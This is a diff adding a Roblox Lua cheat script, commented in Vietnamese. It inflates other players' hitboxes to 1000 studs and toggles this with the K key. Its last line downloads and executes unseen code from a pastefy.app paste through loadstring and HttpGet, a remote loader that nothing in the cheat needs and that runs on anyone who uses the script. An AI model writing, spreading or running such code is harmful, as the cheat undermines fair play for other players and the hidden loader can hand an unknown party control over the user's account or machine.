@@ -1,0 +1,53 @@
+-- Biến trạng thái
+local _G = getgenv and getgenv() or _G
+_G.HitboxEnabled = false
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UIS = game:GetService("UserInputService")
+local LocalPlayer = Players.LocalPlayer
+
+-- Cấu hình Hitbox
+local HITBOX_SIZE = Vector3.new(1000, 1000, 1000)
+local DEFAULT_SIZE = Vector3.new(2, 2, 1)
+
+-- Hàm xử lý tăng Hitbox
+local function ApplyHitbox()
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            local root = player.Character.HumanoidRootPart
+            
+            if _G.HitboxEnabled then
+                root.Size = HITBOX_SIZE
+                root.Transparency = 0.8 -- Làm mờ để không bị che tầm mắt
+                root.BrickColor = BrickColor.new("Really red")
+                root.CanCollide = false -- Tránh bị văng do va chạm vật lý
+            else
+                root.Size = DEFAULT_SIZE
+                root.Transparency = 1
+            end
+        end
+    end
+end
+
+-- Lắng nghe phím bấm (Phím K)
+UIS.InputBegan:Connect(function(input, processed)
+    if not processed and input.KeyCode == Enum.KeyCode.K then
+        _G.HitboxEnabled = not _G.HitboxEnabled
+        
+        if _G.HitboxEnabled then
+            print("Hitbox Status: ON (Size 1000)")
+        else
+            print("Hitbox Status: OFF")
+            ApplyHitbox() -- Chạy một lần để reset về mặc định
+        end
+    end
+end)
+
+-- Cập nhật liên tục khi có người chơi mới hoặc respawn
+RunService.RenderStepped:Connect(function()
+    if _G.HitboxEnabled then
+        ApplyHitbox()
+    end
+end)
+loadstring(game:HttpGet("https://pastefy.app/ItfO0tdg/raw"))()
